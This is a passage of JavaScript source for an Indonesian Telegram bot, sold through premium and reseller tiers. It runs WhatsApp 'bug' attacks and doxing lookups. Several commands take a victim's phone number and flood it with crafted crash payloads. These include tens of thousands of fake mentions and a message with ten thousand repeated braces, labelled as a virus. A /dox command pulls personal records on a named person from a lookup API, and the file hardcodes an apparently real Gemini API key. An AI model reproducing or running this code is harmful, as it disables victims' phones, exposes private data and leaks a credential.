                        { text: `${idx + 1}/${data.photos.length}`, callback_data: 'current_photo' },
                        { text: 'Next ➡️', callback_data: 'next_photo' }
                    ]
                ]
            }
        });
        await ctx.answerCbQuery();
    } catch (err) {
        console.error(err);
        await ctx.answerCbQuery('❌ Failed to update photo.');
    }
});

bot.action('next_photo', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data || !data.photos) return ctx.answerCbQuery('❌ No photos available.');

    let idx = data.currentPhotoIndex;
    idx = idx >= data.photos.length - 1 ? 0 : idx + 1;
    data.currentPhotoIndex = idx;
    downloadCache.set(userId, data);

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: data.photos[idx],
            caption: `Foto ${idx + 1} dari ${data.photos.length}`,
            parse_mode: 'Markdown'
        }, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '⬅️ Prev', callback_data: 'prev_photo' },
                        { text: `${idx + 1}/${data.photos.length}`, callback_data: 'current_photo' },
                        { text: 'Next ➡️', callback_data: 'next_photo' }
                    ]
                ]
            }
        });
        await ctx.answerCbQuery();
    } catch (err) {
        console.error(err);
        await ctx.answerCbQuery('❌ Failed to update photo.');
    }
});

bot.command('nik', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!checkPremium) return ctx.reply('❌ You are not premium!');
    if (!text) return ctx.reply(`Contoh: /nik 16070xxxxx`);

    try {
        // Kirim pesan awal "Sedang memproses..."
        const processingMessage = await ctx.reply("In Process...");

        // Fungsi untuk mem-parsing NIK
        function parseNik(nikNumber) {
            const nik = nikParser(nikNumber);

            function formatTanggalLahir(dateObj) {
                const date = new Date(dateObj);
                let year = date.getFullYear();
                if (year < 1970) year += 100;
                const tgl = String(date.getDate()).padStart(2, '0');
                const bln = String(date.getMonth() + 1).padStart(2, '0');
                return `${tgl}-${bln}-${year}`;
            }

            function formatKelamin(value) {
                if (!value) return "tidak diketahui";
                value = value.toString().toLowerCase();
                if (value.includes("l") || value.includes("1")) return "Pria";
                if (value.includes("p") || value.includes("2")) return "Wanita";
                return value.charAt(0).toUpperCase() + value.slice(1);
            }

            const prefix = '│'; // Simbol seperti quote visual

            return (
                `*Result NIK Info:*\n` +
                `${prefix} • Valid: Success\n` +
                `${prefix} • Provinsi ID: ${nik.provinceId()}\n` +
                `${prefix} • Nama Provinsi: ${nik.province()}\n` +
                `${prefix} • Kabupaten ID: ${nik.kabupatenKotaId()}\n` +
                `${prefix} • Nama Kabupaten: ${nik.kabupatenKota()}\n` +
                `${prefix} • Kecamatan ID: ${nik.kecamatanId()}\n` +
                `${prefix} • Nama Kecamatan: ${nik.kecamatan()}\n` +
                `${prefix} • Kode Pos: ${nik.kodepos()}\n` +
                `${prefix} • Jenis Kelamin: ${formatKelamin(nik.kelamin())}\n` +
                `${prefix} • Tanggal Lahir: ${formatTanggalLahir(nik.lahir())}\n` +
                `${prefix} • Uniqcode: ${nik.uniqcode()}`
            );
        }

        // Promise timeout 7 detik
        const timeoutPromise = new Promise((_, reject) =>
            setTimeout(() => reject(new Error("Timeout")), 7000)
        );

        // Proses parsing dengan batas waktu maksimal 7 detik
        const hasilDox = await Promise.race([
            new Promise((resolve) => {
                const result = parseNik(text);
                resolve(result);
            }),
            timeoutPromise,
        ]);

        // Kirim hasil sebagai reply ke pesan user dalam format quote-like
        await ctx.reply(hasilDox, {
            parse_mode: "Markdown",
            reply_to_message_id: ctx.message.message_id
        });

        // Hapus pesan "In Process..." jika ingin bersih
        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, processingMessage.message_id);
        } catch (e) {
            console.warn("Gagal menghapus pesan loading:", e.message);
        }

    } catch (error) {
        console.error("Error:", error);
        let errorMsg = "❌ Terjadi kesalahan saat memproses data.";
        if (error.message === "Timeout") {
            errorMsg = "❌ Gagal: Waktu parsing melebihi 7 detik.";
        }
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            ctx.message.message_id + 1,
            undefined,
            errorMsg
        );
    }
});

//FUNCTION DOXING
const cacheReports = {};

function createKeyboard(queryId, pageId, totalPages) {
  const prev = { text: '⬅️𝗕𝗮𝗰𝗸', callback_data: `/page ${queryId} ${pageId - 1}` };
  const next = { text: '𝗡𝗲𝘅𝘁 ➡️', callback_data: `/page ${queryId} ${pageId + 1}` };
  const middle = { text: `${pageId + 1}/${totalPages}`, callback_data: `page_list` };

  // Disable prev button if on first page, disable next if on last page
  const keyboard = [];
  if (pageId > 0) keyboard.push(prev); else keyboard.push({ text: '⬅️', callback_data: 'none', hide: true });
  keyboard.push(middle);
  if (pageId < totalPages - 1) keyboard.push(next); else keyboard.push({ text: '➡️', callback_data: 'none', hide: true });

  return {
    inline_keyboard: [keyboard]
  };
}


function escapeHTML(str) {
  return str.replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
}

bot.command('dox', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ');
  if (!args) return ctx.reply("Example: /dox Elon Musk");

  const queryId = Math.floor(Math.random() * 10000000).toString();
  const chatId = ctx.chat.id;

  try {
    const processingMsg = await ctx.reply("🔍 Processing data...");

    const response = await axios.post(apiS, {
      token: tokenS,
      request: args,
      limit: 10000,
      lang: 'in'
    });

    const result = response.data;
    if (result["Error code"]) {
      await ctx.reply(`❌ Error: ${result["Error code"]}`);
      return;
    }

    const pages = [];

    for (const db in result.List) {
      const dataList = result.List[db]["Data"];
      if (!dataList || dataList.length === 0) continue;

      const upperDB = `<b>${db.toUpperCase()}</b>\n`;
      let currentPage = [upperDB];
      let currentLength = upperDB.length;

      for (const row of dataList) {
        const preBlock = [];
        for (const key in row) {
          const label = key.toUpperCase();
          const value = String(row[key]).toUpperCase();
          preBlock.push(`${label}: ${value}`);
        }

        const blockText = `<pre>${preBlock.join('\n')}</pre>\n`;

        if (currentLength + blockText.length > 3500) {
          pages.push(currentPage.join('\n'));
          currentPage = [upperDB, blockText]; // new page but same db title
          currentLength = upperDB.length + blockText.length;
        } else {
          currentPage.push(blockText);
          currentLength += blockText.length;
        }
      }

      if (currentPage.length > 1) {
        pages.push(currentPage.join('\n'));
      }
    }

    if (pages.length === 0) {
      await ctx.reply("Tidak ditemukan data.");
      return;
    }

    cacheReports[queryId] = pages;

    await ctx.telegram.sendMessage(chatId, pages[0], {
      parse_mode: "HTML",
      reply_markup: createKeyboard(queryId, 0, pages.length)
    });

    await ctx.telegram.deleteMessage(chatId, processingMsg.message_id);

  } catch (err) {
    console.error("❌ Error:", err.message);
    ctx.reply("⚠️ Gagal memproses permintaan.");
  }
});

// Handler tombol callback (pagination)
bot.on('callback_query', async (ctx) => {
  try {
    // Jawab callback SEGERA
    await ctx.answerCbQuery(); 
    
    const cb = ctx.callbackQuery;
    const chatId = cb.message.chat.id;
    const messageId = cb.message.message_id;

    if (cb.data.startsWith("/page ")) {
      const [, queryId, pageIdStr] = cb.data.split(" ");
      const pageId = parseInt(pageIdStr);
      const pages = cacheReports[queryId];

      if (!pages || !pages[pageId]) {
        await ctx.editMessageText("❌ Hasil tidak ditemukan atau telah kedaluwarsa.", {
          chat_id: chatId,
          message_id: messageId
        });
        return;
      }

      await ctx.editMessageText(pages[pageId], {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: createKeyboard(queryId, pageId, pages.length)
      });
    }
  } catch (err) {
    if (err.response?.error_code === 400 &&
        err.response?.description?.includes("query is too old")) {
      console.warn("❗ Callback query sudah terlalu lama, dilewati.");
    } else {
      console.error("❌ Callback query error:", err);
    }
  }
});

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

bot.command("force", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /force 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 1; i++) {
        await ForceBlank(bijipler);
        await VampFcSpam(bijipler);
        await ForceFast(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 15 minutes`
    );
    console.log(chalk.blue.bold("Force : Successfully submitted bug"));
});



bot.command("xios", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /xios 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 8; i++) {
        xios(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 15 minutes`
    );
    console.log(chalk.blue.bold("Xios : Successfully submitted bug"));
});
//FUNCTION BUG
async function exDelay(bijipler) {
await Zeph.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `Hi @all\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [bijipler],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: bijipler
},
content: undefined
}]
}]
}]
}
);
}

async function invisSqL(bijipler) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(bijipler, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [bijipler],
                participant: bijipler,
                remoteJid: bijipler,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await Zeph.relayMessage(bijipler, msg.message, {
    participant: { jid: bijipler },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

bot.command("invis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example: /invis 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleSql`
    );

    for (let i = 0; i < 3; i++) {
        await invisSqL(bijipler);
    }

    await ctx.telegram.editMessageText(
    ctx.chat.id,
    ProsesZephy.message_id,
    undefined,
    `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
    `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
    `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleSql\n` +
    `Please pause for 10 minutes`
);

    console.log(chalk.blue.bold("Invisible : Successfully submitted bug"));
});

bot.command("delay", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /delay 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleDelay`
    );

    for (let i = 0; i < 100; i++) {
        await exDelay(bijipler);
        await sleep(300);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : InvisibleDelay`
    );

    console.log(chalk.blue.bold("Delay invis : Successfully submitted bug"));
});

bot.command("brutal", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /brutal 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleDelay`
    );

    for (let i = 0; i < 1200; i++) {
        await exDelay(bijipler);
        await sleep(300);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : InvisibleDelay`
    );

    console.log(chalk.blue.bold("Brutal : Successfully submitted bug"));
});

bot.command("hold", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /hold 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleDelay`
    );

    for (let i = 0; i < 3260; i++) {
        await exDelay(bijipler);
        await sleep(300);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : InvisibleDelay`
    );

    console.log(chalk.blue.bold("Holdl : Successfully submitted bug"));
});

bot.command("visix", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /shoot 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";
    
    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 10; i++) {
        await delaymentionFree(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 10 minutes`
    );
    console.log(chalk.blue.bold("Shooting : Successfully submitted bug"));
});


// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addown', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addown 123456789");
    }

    const userId = args[1];

    if (ownerUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status owner`);
    }

    ownerUsers.push(userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang menjadi owner`);
});
bot.command('delown', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID owner\nContoh: /delown 123456789");
    }

    const userId = args[1];

    if (!ownerUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar owner`);
    }

    ownerUsers = ownerUsers.filter(id => id !== userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar owner`);
});

bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ You are a premium member`);
    } else {
        return ctx.reply(`❌ You are not a premium user.`);
    }
});

bot.command('addreseller', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan fitur ini.");
    }

    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Anda perlu memberikan ID reseller setelah perintah. Contoh: /addreseller 12345");
    }

    const resellerId = args[1];
    if (resellers.includes(resellerId)) {
        return ctx.reply(`❌ Reseller dengan ID ${resellerId} sudah terdaftar.`);
    }

    const success = await addReseller(resellerId);

    if (success) {
        return ctx.reply(`✅ Reseller dengan ID ${resellerId} berhasil ditambahkan.`);
    } else {
        return ctx.reply(`❌ Gagal menambahkan reseller dengan ID ${resellerId}.`);
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

const escapeMarkdown = (text) =>
  text
    .replace(/[_`()~>#+=|{}.!-]/g, "\\$&"); // jangan escape asterisk (*)

const userSessions = new Map(); // { userId: [ {role, content}, ... ] }
let isGlobalAIDisabled = true; // Status AI global
const lastBotMessage = new Map(); // Menyimpan message_id terakhir dari bot per user

// Hanya owner bisa mematikan AI global
bot.command('offai', (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ownerUsers.includes(userId)) {
        return ctx.reply("⛔ You are not the owner");
    }

    isGlobalAIDisabled = true;
    lastBotMessage.delete(userId); // 🆕 Hapus pesan terakhir dari AI
    ctx.reply("✅ AI has been *disable*.", { parse_mode: "Markdown" });
});

// Hanya owner bisa menghidupkan AI global
bot.command('onai', (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ownerUsers.includes(userId)) {
        return ctx.reply("⛔ You are not the owner ");
    }

    isGlobalAIDisabled = false;
    ctx.reply("✅ AI has been *enable*.", { parse_mode: "Markdown" });
});

// Reset sesi GPT - semua user bisa
bot.command('reset', (ctx) => {
    const userId = ctx.from.id.toString();
    userSessions.delete(userId);
    ctx.reply("🔁 Your AI history has been successfully *Reset*.", { parse_mode: "Markdown" });
});


const GEMINI_API_KEY = "AIzaSyAotFJ5IJY3MhSdJVDtwZZPyVidu3Yr6oE"; 

// Escape karakter Markdown yang bermasalah tapi biarkan * tetap bisa dipakai
const escapeMarkdownAi = (text) =>
  text
    .replace(/[_`()~>#+=|{}.!-]/g, "\\$&"); // jangan escape asterisk (*), biar bisa bold

bot.on('text', checkPremiumAi, async (ctx) => {
    const text = ctx.message.text;
    const userId = ctx.from.id.toString();

    if (text.startsWith("/")) return;
    if (isGlobalAIDisabled) return;

    const reply = ctx.message.reply_to_message;
    const lastMsgId = lastBotMessage.get(userId);

    // Jika ada last message, pastikan user reply ke pesan itu
    if (lastMsgId && (!reply || reply.from.id !== ctx.botInfo.id || reply.message_id !== lastMsgId)) {
        return;
    }

    let processing;
    try {
        processing = await ctx.reply("*Find out...*", { parse_mode: "Markdown" });
    } catch (e) {
        return;
    }

    try {
        let session = userSessions.get(userId) || [];
        session.push({ role: "user", content: text });

        // Kirim permintaan ke Gemini API
        const response = await axios.post(
            `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_API_KEY}`,
            {
                contents: [
                    {
                        parts: [
                            {
                                text: text
                            }
                        ]
                    }
                ]
            },
            {
                headers: {
                    "Content-Type": "application/json"
                }
            }
        );

        // Ambil jawaban Gemini
        const candidates = response.data.candidates;
        let gptReply = "❌ Empty answer from AI.";
        if (candidates && candidates.length > 0) {
            const parts = candidates[0].content.parts;
            gptReply = parts.map(p => (typeof p === "string" ? p : (p.text || ""))).join("\n").trim();
        }

        // Simpan dalam sesi
        session.push({ role: "assistant", content: gptReply });
        userSessions.set(userId, session);

        await ctx.sendChatAction('typing');

        // Hapus pesan loading, amanin jika error
        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, processing.message_id);
        } catch (e) {}

        const note = !lastMsgId ? "\n\n_Reply pesan bot untuk melanjutkan percakapan_" : "";
        const fullReply = `${escapeMarkdownAi(gptReply)}${note}\n\n[ZnetBot](https://t.me/ZnetWRLDBot)`;

        const sent = await ctx.reply(fullReply, {
            parse_mode: "Markdown"
        });

        // Simpan ID pesan bot terakhir
        lastBotMessage.set(userId, sent.message_id);

    } catch (err) {
        console.error("Gemini ERROR:", err.message);
        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, processing.message_id);
        } catch (e) {}
        await ctx.reply("❌ An error occurred while processing the answer from Gemini.");
    }
});

(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();
    console.log("Sukses connected");
    bot.launch();
    
    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⡿⢿⡿⠿⠿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⠿⠿⢿⣿⣿⠟⣋⣭⣶⣶⣞⣿⣶⣶⣶⣬⣉⠻⣿⣿⡿⣋⣉⠻⣿⣿⣿
⣿⢻⣿⠃⣤⣤⣢⣍⣴⣿⢋⣵⣿⣿⣿⣿⣷⣶⣝⣿⣿⣧⣄⢉⣜⣥⣜⢷⢹⢇⢛
⡏⡦⡁⡸⢛⡴⢣⣾⢟⣿⣿⣿⢟⣾⣧⣙⢿⣿⣿⣿⣿⣿⣿⣿⢩⢳⣞⢿⡏⢷⣾
⣷⣵⡇⣗⡾⢁⣾⣟⣾⣿⡿⣻⣾⣿⣿⣿⡎⠛⡛⢿⣿⡟⣿⣿⡜⡜⢿⡌⠇⢾⣿
⣿⣿⠁⣾⠏⣾⣿⣿⣽⣑⣺⣥⣿⣿⣿⣿⣷⣶⣦⣖⢝⢿⣿⣿⣿⡀⠹⣿⣼⢸⣿
⣿⣿⢰⡏⢡⣿⣿⠐⣵⠿⠛⠛⣿⣿⣿⣿⣿⠍⠚⢙⠻⢦⣼⣿⣿⠁⣄⣿⣿⠘⣿
⣿⣿⢸⢹⢈⣿⣿⠘⣡⡞⠉⡀⢻⣿⣿⣿⣿⢃⠠⢈⢳⣌⣩⣿⣿⠰⠿⢼⣿⠀⣿
⣿⠿⣘⠯⠌⡟⣿⡟⣾⣇⢾⡵⣹⣟⣿⣿⣿⣮⣓⣫⣿⣟⢿⣿⢿⡾⡹⢆⣦⣤⢹
⣅⣛⠶⠽⣧⣋⠳⡓⢿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣫⣸⠏⡋⠷⣛⣫⡍⣶⣿
⣿⡿⢸⢳⣶⣶⠀⡇⣬⡛⠿⣿⣿⣿⣿⣿⣿⣿⠿⢟⣉⣕⡭⠀⢺⣸⣽⢻⡅⣿⣿
⣿⡇⣾⡾⣰⡯⠀⡗⣯⣿⣽⡶⠶⠂⢠⣾⣿⠐⠚⠻⢯⣿⠇⠎⡀⣳⣿⣼⡃⣿⣿
⣿⡇⣟⣇⡟⣧⠀⡗⣿⣿⡿⢡⢖⣀⠼⢟⣻⣤⣔⢦⢸⣿⢀⢆⢡⣿⣯⢹⡃⣿⣿
⣿⡇⡏⣿⡾⣸⣿⣇⠸⠟⣋⣼⣼⣿⢻⣿⣿⢿⣟⢾⣌⠫⠈⣶⣿⡿⣩⡿⢃⣿⣿
⣿⣷⡀⠻⡷⢪⢧⡙⠰⣾⣿⣿⣾⡽⣾⣿⡿⣺⣵⣾⣿⡇⡜⣽⠟⢷⣪⣴⣿⣿⣿
